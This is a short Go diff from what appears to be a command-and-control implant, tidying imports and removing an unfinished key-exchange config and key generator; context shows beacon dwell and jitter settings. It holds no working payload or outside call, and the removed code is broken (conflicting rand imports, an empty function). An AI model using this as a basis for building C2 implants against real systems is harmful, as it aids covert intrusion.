@@ -6,16 +6,15 @@ import (
 	"crypto/rand"
 	"encoding/json"
 	"fmt"
-	"github.com/go-co-op/gocron/v2"
 	"io"
-	"math"
-	"math/big"
 	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
 	"time"
+
+	"github.com/go-co-op/gocron/v2"
 )
 
 /*
@@ -42,26 +41,6 @@ Implant side:
 type BeaconConfig struct {
 	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
 	Jitter float64 `json:"jitter"`
-}
-
-// CryptoConfig stores shared crypto settings w/ the C2Server
-type CryptoConfig struct {
-	Prime           uint    `json:"prime"`
-	Generator       uint    `json:"generator"`
-	ServerPublicKey big.Int `json:"server_public_key"`
-	PublicKey       big.Int `json:"public_key"`
-	sharedSecret    big.Int
-	privateKey      big.Int
-}
-
-func NewCryptoConfig() *CryptoConfig {
-
-}
-
-func (c *CryptoConfig) generatePrivateKey() {
-	prime, _ := rand.Prime(rand.Reader, 128)
-	privateKey, _ := rand.Int(rand.Reader, prime)
-	c.privateKey = privateKey
 }
 
 type Implant struct {
